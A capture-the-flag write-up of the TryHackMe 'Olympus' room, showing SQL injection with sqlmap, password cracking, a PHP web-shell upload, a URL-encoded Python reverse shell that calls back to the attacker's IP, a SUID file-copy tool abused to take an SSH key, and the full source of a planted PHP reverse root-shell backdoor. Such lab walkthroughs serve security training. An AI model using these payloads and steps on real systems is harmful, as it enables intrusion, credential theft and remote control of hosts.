# THM-Olympus-CTF

Room : https://tryhackme.com/room/olympusroom

# Port Scanning
As you can see from the Nmap scan, port 22 ssh and port 80 are open. And port 80 redirects us to http://olympus.thm 

```bash
root@ip-10-10-230-85:~# rustscan -a 10.10.182.192 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time \u231b

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.182.192:22
Open 10.10.182.192:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Add the domain name olympus to your hosts file
```bash
echo "10.10.27.68 olympus.thm" >> /etc/hosts
```
Et voilà !  We have access to the web site.Unfortunately, we are greeted with a message saying that this site is still under construction...

![image](https://user-images.githubusercontent.com/90036439/223972505-ab22dc4d-99b4-4295-96e5-7d3ec9145d5a.png)

# Enumeration
Let's start by seeing if we can discover some interesting files 

```bash
root@ip-10-10-70-200:~# ffuf -u http://olympus.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://olympus.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 1948, Words: 238, Lines: 48]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10]
~webmaster              [Status: 301, Size: 315, Words: 20, Lines: 10]
```
Bingo ! We have ~webmaster

![image](https://user-images.githubusercontent.com/90036439/223973205-ac9467ee-8ca2-43be-906c-0b69d4c14fcf.png)

# Initial access

While messing around on the site I was able to trigger an SQL error on the "search" parameter. By doing some research, I saw that Victor CMS was vulnerable to SQL injections.
https://www.exploit-db.com/exploits/48734

![image](https://user-images.githubusercontent.com/90036439/223974836-e8de8d9a-c3f8-43d0-91da-08e3753e8d06.png)

I saved the query via burpsuit and send it to sqlmap. I was able to recover all the databases on the server. But only Olympus interests me.
So I dump all the data from the Olympus

```bash
root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dbs

[...]

[09:17:14] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus
```
![image](https://user-images.githubusercontent.com/90036439/223977555-baf68ac5-5e32-4d50-b2c7-c0ea7013e61a.png)

Now that we have hashes we can try to crack some user password. First i tried promotheus.
After a while I got a password
```bash
root@ip-10-10-70-200:~# john promotheus.hash -w=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s[.........]e       (?)
1g 0:00:06:29 DONE (2023-03-09 09:30) 0.002569g/s 10.31p/s 10.31c/s 10.31C/s 19861986..543210
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Exploring the database i found a table called chats. 

```Database: olympus
Table: chats
[3 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
```
So we have some chat logs but we can't find it anywhere... I try to push my luck by adding chat.olympus.thm to my /etc/hosts file. And it worked...!

![image](https://user-images.githubusercontent.com/90036439/223983373-552684f7-5e73-4b54-ba76-ff0d0c38858a.png)

I logged in with the credentials I cracked prometheus:s[........]e

![image](https://user-images.githubusercontent.com/90036439/223985036-95de1514-234a-4bfb-8717-edfccd387bd5.png)

Let's put together what we know. The IT guy made sure that the files that are sent to the server via chat have a random name. We also know that all messages are stored in the database including the files that we send. We can make a php file containing a reverse shell or one that executes commands on the server. Upload it via the chat. Dump the database, get the name of our file and exploit it !

First, make the file containing the php exploit and send it via the chat.
```bash
root@ip-10-10-70-200:~# cat totalyNotEvileFile.php 
<?php system($_GET["cmd"]); ?>
```
Secondly, dump the database using the argument --fresh-queries to get the new entry.
```bash
root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus -T chats --fresh-queries 
```
```bash
Database: olympus
Table: chats
[4 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
| 2023-03-09 | Attached : totalyNotEvileFile.php                                                                                                                               | 68f62a3e00cf75c6a0ddc9b949f36850.php | prometheus |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
```

The ast step is to know where the file is located, quick directory fuzzing on chat.olympus.thm and we have the directory uploads.

```bash
root@ip-10-10-70-200:~# ffuf -u http://chat.olympus.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://chat.olympus.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 281, Words: 20, Lines: 10]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
javascript              [Status: 301, Size: 325, Words: 20, Lines: 10]
phpmyadmin              [Status: 403, Size: 281, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10]
static                  [Status: 301, Size: 321, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 322, Words: 20, Lines: 10]
```
To test our php file 
```bash
http://chat.olympus.thm/uploads/68f62a3e00cf75c6a0ddc9b949f36850.php?cmd=id
```

![image](https://user-images.githubusercontent.com/90036439/223988276-0a0779ab-2cfd-4b1e-a09f-c56f732dd54c.png)

Now set up a listener 
```bash
nc -lvnp 9001
```
And send a revershell via the php file that we uploaded on the server. Don't forget to URL encode it.

```
curl http://chat.olympus.thm/uploads/32c800549703817361ff290d8b2bfc9a.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.10.70.200%22%2C9001%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%20f%20in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
```

Aaaand we are on the server ! Now stabilize your shell before we start to move laterally.

```bash
root@ip-10-10-70-200:~# nc -lvnp 9001
Listening on [0.0.0.0] (family 0, port 9001)
Connection from 10.10.27.68 35650 received!
www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")';export TERM=xterm
<mport pty;pty.spawn("/bin/bash")';export TERM=xterm            
www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ ^Z
[1]+  Stopped                 nc -lvnp 9001
root@ip-10-10-70-200:~# stty raw -echo;fg
nc -lvnp 9001

www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ 
```
# Lateral movement

Doing my usual routine i found cputils ! Cputils has the SUID bit set for the user zeus

```bash
www-data@olympus:/var/www/html/chat.olympus.thm$ find / -type f -perm -4000 2>/dev/null | grep -v /snap*
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/cputils
/usr/bin/sudo
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/newgrp
```
```bash
www-data@olympus:/var$ ls -la /usr/bin/cputils
-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
```
Looking at the strings of cputils, I have to give him a source file and a target path, so he can copy the file we gave him.
```zeus@olympus:~$ strings /usr/bin/cputils 
/lib64/ld-linux-x86-64.so.2
libstdc++.so.6
[...]
Enter the Name of Source File: 
Error Occurred!
Enter the Name of Target File: 
File copied successfully.
:*3$"
[...]
```

Let's try to copy the ssh key of the user zeus.

```bash
www-data@olympus:/var$ /usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /dev/shm/id_rsa

File copied successfully.
```
Now that we have the key we need to make it usable.

```bash
root@ip-10-10-239-74:~# /opt/john/ssh2john.py id_rsa > id_rsa.hash

root@ip-10-10-239-74:~# john id_rsa.hash -w=/usr/share/wordlists/rockyou.txt 
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s[.......]e        (id_rsa)
```
Cewl, we have the password of the key, let's ssh into the machine !

```
root@ip-10-10-239-74:~# chmod 600 id_rsa
root@ip-10-10-239-74:~# ssh zeus@olympus.thm -i id_rsa
The authenticity of host 'olympus.thm (10.10.156.81)' can't be established.
ECDSA key fingerprint is SHA256:BqnHMThyqUjFcrDWSnnsynFs5F73vFA3UXh2zTxQDd4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'olympus.thm,10.10.156.81' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 09 Mar 2023 01:05:53 PM UTC

  System load:  0.0               Processes:             126
  Usage of /:   43.6% of 9.78GB   Users logged in:       0
  Memory usage: 69%               IPv4 address for eth0: 10.10.156.81
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

33 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 16 07:52:39 2022
zeus@olympus:~$ 
```

# Privilege escalation to root

While exploring the room, I came across these folders with random names containing a php file

```bash
zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls
index.html  VIGQFQFMYOST.php
```
```
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
```
It seems that promotheus has set up a backdoor. And uses an evil lib libc.so.99 to gain root access
```
$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";
```

Run the exploit AND BOOM we are ROOT !!!

```
zeus@olympus:~$ uname -a; w;/lib/defended/libc.so.99
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 13:44:59 up  1:34,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
zeus     pts/2    10.10.239.74     13:05   19:55   0.11s  0.11s -bash
zeus     pts/4    10.10.77.8       13:37    3.00s  0.03s  0.00s w
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus)
# 
```
# Flag 1
In the database !

```
mysql> select * from flag;
+---------------------------+
| flag                      |
+---------------------------+
| flag{...................} |
+---------------------------+
1 row in set (0.00 sec)
```
# Flag 2
In zeus /home !

```
zeus@olympus:~$ cat user.flag 
flag{.........................}
```
# Flag 3
In root directory !

```
cat root.flag
flag{...............}
```
# Flag 4 - Bonus
In /etc/ directory !

```
# grep -Ri flag{ 2>/dev/null
ssl/private/.b0nus.fl4g:flag{................}
```
